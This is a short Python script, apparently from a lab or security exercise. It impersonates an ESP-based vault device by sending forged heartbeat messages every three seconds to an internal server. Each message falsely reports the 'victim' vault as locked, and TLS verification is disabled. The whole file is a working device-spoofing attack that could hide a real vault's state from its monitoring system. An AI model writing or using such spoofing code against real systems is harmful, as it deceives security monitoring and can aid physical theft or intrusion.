import requests
import time
import json
import urllib3

# Disable SSL warnings (ESP uses insecure TLS too)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIG ====================
SERVER_HOST = "10.132.21.117"
SERVER_PORT = 3001
URL = f"https://{SERVER_HOST}:{SERVER_PORT}/heartbeat"

# Target device to impersonate
DEVICE_ID = "VAULT_5E4826"   # ← victim device ID
FAKE_STATE = "LOCKED"         # ← lie here

HEADERS = {
    "Content-Type": "application/json"
}

# ==================== MAIN LOOP ====================
print("[*] Fake ESP started...")
while True:
    payload = {
        "deviceId": DEVICE_ID,
        "vaultState": FAKE_STATE,
        "timestamp": int(time.time() * 1000)  # similar to millis()
    }

    try:
        r = requests.post(
            URL,
            headers=HEADERS,
            data=json.dumps(payload),
            verify=False,   # matches client.setInsecure()
            timeout=3
        )
        print(f"[+] Sent fake heartbeat | Status: {r.status_code}")
    except Exception as e:
        print("[-] Error:", e)

    time.sleep(3)
